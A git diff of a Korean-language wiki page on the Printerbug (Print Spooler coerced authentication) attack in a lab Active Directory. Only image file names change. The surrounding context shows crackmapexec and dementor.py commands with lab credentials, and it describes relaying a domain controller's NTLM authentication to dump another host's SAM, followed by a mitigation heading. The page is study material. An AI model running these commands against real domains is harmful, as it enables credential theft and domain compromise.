@@ -34,7 +34,7 @@ Printerbug (프린터버그) / Print Spooler RPC 강제 인증은 타겟 서버�
 cme smb dc01.choi.local -u low -p 'Password123!' -d choi.local -M spooler
 ```
 
-![Enabled! Spooler 서비스/RPC가 작동중이다.](<../../.gitbook/assets/image (5) (2).png>)
+![Enabled! Spooler 서비스/RPC가 작동중이다.](<../../.gitbook/assets/image (5) (2) (1).png>)
 
 2\. 프린터버그 강제 인증을 실행하기 전, NTLM 릴레이를 먼저 세팅한다.&#x20;
 
@@ -52,7 +52,7 @@ python3 dementor.py -u low -p 'Password123!' -d choi.local 192.168.40.182 192.16
 
 dc01.choi.local (192.168.40.150) 에게 프린터버그 강제인증 실행 -> dc01의 머신계정 (`choi.local\dc01$`) 의 NTLM 인증 트래픽이 공격자 호스트에게 전달 -> 그것을 릴레이해서 dc1.pci.choi.local 에게 전달 -> `dc01.choi.local` 이 `dc1.pci.choi.local` 의 로컬 관리자 권한을 갖고 있었기 때문에 SAM 덤프.&#x20;
 
-![](<../../.gitbook/assets/image (7).png>)
+![](<../../.gitbook/assets/image (7) (3).png>)
 
 ### 대응 방안&#x20;
 
@@ -62,4 +62,4 @@ dc01.choi.local (192.168.40.150) 에게 프린터버그 강제인증 실행 -> d
 
 &#x20;
 
-![프린트는 프린터에서 - 도메인 컨트롤러는 소중하다.](<../../.gitbook/assets/image (4) (2).png>)
+![프린트는 프린터에서 - 도메인 컨트롤러는 소중하다.](<../../.gitbook/assets/image (4) (2) (1).png>)
